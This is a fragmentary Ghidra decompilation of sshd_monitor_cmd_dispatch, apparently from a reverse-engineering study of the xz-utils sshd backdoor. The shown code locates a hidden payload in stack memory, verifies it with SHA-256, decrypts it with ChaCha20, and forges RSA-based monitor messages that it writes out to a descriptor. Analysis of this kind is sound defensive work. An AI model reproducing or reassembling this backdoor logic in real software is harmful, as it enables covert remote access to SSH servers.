// /home/kali/xzre-ghidra/xzregh/108270_sshd_monitor_cmd_dispatch.c
// Function: sshd_monitor_cmd_dispatch @ 0x108270
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_monitor_cmd_dispatch(monitor_data_t * args, global_context_t * ctx)
...
LAB_0010845f:
    ...
    if ((args->cmd_type == MONITOR_CMD_PROXY_EXCHANGE) &&
      ...
      do {
        ...
        if ((long *)0xffffff < stack_candidate) {
          success = is_range_mapped_via_pselect((u8 *)stack_candidate,0x4001 - payload_size,ctx);
          if (success != FALSE) {
            ...
            for (; stack_candidate < payload_scan_end; stack_candidate = (long *)((long)stack_candidate + 1)) {
              ...
              if ((*stack_candidate == loop_idx) &&
                 (success = sha256_digest(stack_candidate,payload_size,(u8 *)netlen_tmp,0x20,ctx->imported_funcs),
                 success != FALSE)) {
                digest_idx = 0;
                while( TRUE ) {
                  ...
                  if (digest_idx == 0x20) {
                    ...
                    success = chacha20_decrypt((u8 *)request_words,(int)payload_size,(u8 *)netlen_tmp,(u8 *)stack_candidate,
  ...
  if (((rsa_alg_name != (char *)0x0) && (ctx->rsa_sha2_256_alg != (char *)0x0)) &&
     (success = pointer_array_has_null(&imports->RSA_new,9), success == FALSE)) {
    ...
    *(uint *)(rsa_cert_alg_prefix + 0x19) = (uint)(*(u64 *)(rsa_alg_name + 0xc) >> 0x20);
    ...
    while( TRUE ) {
      ...
      success = bignum_mpint_serialize
                         (monitor_req_payload + payload_remaining,payload_room,&serialized_chunk_len,rsa_components[digest_idx],imports);
...
LAB_001089b5:
                ...
                netlen_tmp[0] = frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 |
                               frame_len_be * 0x1000000;
                io_result = fd_write_full(status,netlen_tmp,5,libc_funcs);
                if (io_result < 0) {
                  return FALSE;
                }
                io_result = fd_write_full(status,sshbuf_vec[0].rsa_d_bn,payload_size,libc_funcs);
                if (io_result < 0) {
                  return FALSE;
                }
